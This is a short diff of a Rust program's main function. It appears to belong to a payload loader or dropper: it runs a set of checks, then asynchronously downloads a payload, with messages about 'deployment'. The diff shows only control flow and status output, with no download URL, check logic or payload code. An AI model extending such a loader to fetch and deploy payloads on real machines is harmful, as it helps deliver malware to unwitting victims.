@@ -3,18 +3,23 @@ mod downloader;
 
 use crate::checks::checks::{perform_checks};
 use crate::downloader::downloader::download_payload;
+use std::process;
 
-fn main() {
+
+#[tokio::main]
+async fn main() {
 
     if perform_checks() {
-        println!("[!] All Checks OK ✔️");
-        if download_payload() {
-            println!("[!] Payload Downloaded ✔️");
+        println!("[+] All Checks OK ✔️");
+        if let Err(e) = download_payload().await {
+            println!("[x] Failed to download payload ❌: {}", e);
+            process::exit(1);
         } else {
-            println!("[X] Failed to download payload ❌")
+            println!("[+] Payload downloaded successfully ✔️")
+            
         }
     } else {
-        println!("[X] Checks Failed aborting deployment ❌");
+        println!("[x] Checks Failed aborting deployment ❌");
     }
 
 }
